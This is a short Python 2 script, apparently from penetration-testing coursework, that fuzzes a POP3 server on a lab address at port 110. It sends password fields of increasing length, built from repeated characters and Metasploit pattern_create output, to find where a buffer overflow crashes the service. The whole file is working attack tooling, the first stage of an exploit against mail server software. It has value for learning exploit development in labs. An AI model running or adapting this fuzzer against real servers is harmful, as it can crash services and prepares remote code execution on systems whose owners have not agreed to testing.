#!/usr/bin/python

import socket
import subprocess

buffer=[]

counter=100
while len(buffer) <= 30:
	buffer.append("i"*counter)
	print "Calling Metasploit script to construct string..."
	patternSub = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", str(counter)], stdout=subprocess.PIPE)
	print "Receiving pattern from process..."
	bufferAdd=patternSub.communicate()[0]
	print "Adding pattern to buffer..."
	buffer.append(bufferAdd)
	counter += 200

for string in buffer:
	try:
		print "Sending targeted pattern to PASS with %s bytes" % len(string)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = sock.connect(("10.11.15.76", 110))
		sock.recv(1024)
		sock.send("USER test\r\n")
		sock.recv(1024)
		sock.send("PASS " + string + "\r\n")
		sock.send("QUIT\r\n")
	finally:
		sock.close()
